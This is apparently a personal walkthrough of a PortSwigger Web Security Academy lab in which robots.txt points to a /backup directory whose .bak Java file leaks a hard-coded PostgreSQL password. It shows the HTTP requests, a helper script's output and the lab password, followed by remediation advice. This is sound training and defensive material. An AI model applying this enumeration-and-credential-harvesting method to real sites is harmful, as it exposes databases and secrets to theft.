# PortSwigger Lab: Source code disclosure via backup files

# TAGS: Information Disclosure, Backup Files, Source Code, Burp Suite

Category: Information Disclosure
Date: October 29, 2026
Day: Thursday
Link: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files
Published: Ready
Status: Done

---

## Intro

This is the third lab in the **Information Disclosure** series. Here the application leaks its **source code through backup files**: a hidden `/backup` directory is listed in `robots.txt`, exposes a directory listing, and serves `ProductTemplate.java.bak` with a hard-coded PostgreSQL password.

The official solution points to Burp Suite Professional's **Discover content** engagement tool. Since that isn't available in Burp Community, I wrote a small script that follows `robots.txt`, lists the directory and greps the leaked source for credentials.

This write-up covers the reconnaissance, the exploitation steps, the root cause, the real-world impact, and how to prevent it.

---

## Reconnaissance:

#### Lab Description Lookup:

The lab description says the application leaks its source code via backup files in a hidden directory. The goal is to identify and submit the **database password**, which is hard-coded in the leaked source code.

The first stop is `robots.txt`:

```http
GET /robots.txt HTTP/2
Host: 0a7b0052030bba9c8412f9a2002d0039.web-security-academy.net
```

```text
User-agent: *
Disallow: /backup
```

That is a direct pointer to the hidden directory — `robots.txt` is a public roadmap to the paths the owner doesn't want indexed.

---

## Exploitation:

#### Step 1: Discover the hidden directory

The official solution uses Burp Pro's **Discover content** to find `/backup`. With Burp Community, I used `scripts/find_backup_leaks.py`, which reads `robots.txt`, lists the disallowed directories and downloads anything that looks like a backup/source file:

```bash
python3 find_backup_leaks.py 0a7b0052030bba9c8412f9a2002d0039.web-security-academy.net
```

```text
[*] robots.txt Disallow paths: /backup
[200] https://0a7b0052030bba9c8412f9a2002d0039.web-security-academy.net/backup/
```

#### Step 2: List the backup directory

```http
GET /backup/ HTTP/2
Host: 0a7b0052030bba9c8412f9a2002d0039.web-security-academy.net
```

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8

...
<a href="ProductTemplate.java.bak">ProductTemplate.java.bak</a>
```

Directory listing enabled **and** a `.bak` file — the whole source is right there.

#### Step 3: Read the leaked source code

```http
GET /backup/ProductTemplate.java.bak HTTP/2
Host: 0a7b0052030bba9c8412f9a2002d0039.web-security-academy.net
```

The connection builder contains the hard-coded credentials:

```java
ConnectionBuilder connectionBuilder = ConnectionBuilder.from(
        "org.postgresql.Driver",
        "postgresql",
        "localhost",
        5432,
        "postgres",
        "postgres",
        "3jlb5scfp02k6eiel4wfeqho2vjcdwpb"
).withAutoCommit();
```

The database password is:

```text
3jlb5scfp02k6eiel4wfeqho2vjcdwpb
```

The tool printed it in the "long quoted strings (possible secrets)" section.

#### Step 4: Submit the password

I clicked **Submit solution** and sent it to `/submitSolution`:

```http
POST /submitSolution HTTP/2
Host: 0a7b0052030bba9c8412f9a2002d0039.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

answer=3jlb5scfp02k6eiel4wfeqho2vjcdwpb
```

```json
{"correct":true}
```

The lab showed **"Congratulations, you solved the lab!"**.

---

## Root Cause

Three mistakes combine:

1. **Backup files are deployed to the web root** — `ProductTemplate.java.bak` is served as a static file.
2. **Directory listing is enabled**, so the backup directory enumerates itself.
3. **`robots.txt` advertises the hidden directory**, turning "security by obscurity" into a direct hint.

On top of that, the leaked source contains a **hard-coded database password**, so source disclosure becomes direct database access.

---

## Impact

An attacker obtains the production database password and can connect to PostgreSQL directly — reading or modifying all data. Leaked source code also reveals application logic, internal paths and other secrets, which helps craft further attacks. In real incidents, exposed `.bak`/`.git`/`.env` files are a common cause of full compromise.

---

## Remediation

To prevent this issue, applications should:

- **Never deploy backup/source files** (`.bak`, `.old`, `.zip`, `.git`, `.env`) to the web root; block those extensions at the server level;
- **Disable directory listing**;
- Do not list sensitive paths in `robots.txt` — it is public;
- **Never hard-code credentials**; use a secrets manager or environment variables outside the web root;
- Add a deployment check that fails if source/backup artifacts are present.

---

## Key Takeaways

1. `robots.txt` is a roadmap: it often points to exactly what you're looking for.
2. Backup files frequently contain full source code and secrets.
3. Directory listing + `.bak` = complete source disclosure.
4. A small script can replace the paid "Discover content" tool.

---

## References

- [PortSwigger — Information disclosure](https://portswigger.net/web-security/information-disclosure)
- [PortSwigger — Source code disclosure via backup files (lab)](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files)
- [OWASP — Improper Error Handling](https://owasp.org/www-community/Improper_Error_Handling)

---

## Disclaimer

This write-up was created for educational purposes only. All testing was performed in an authorized PortSwigger Web Security Academy laboratory environment. Never test systems without explicit authorization.

This article was written with the assistance of artificial intelligence tools for text review, structure, and grammar correction. However, the entire testing process, technical analysis, vulnerability exploitation, and conclusions presented are the sole responsibility of the author and are based on tests performed in a controlled environment provided by the PortSwigger Web Security Academy.
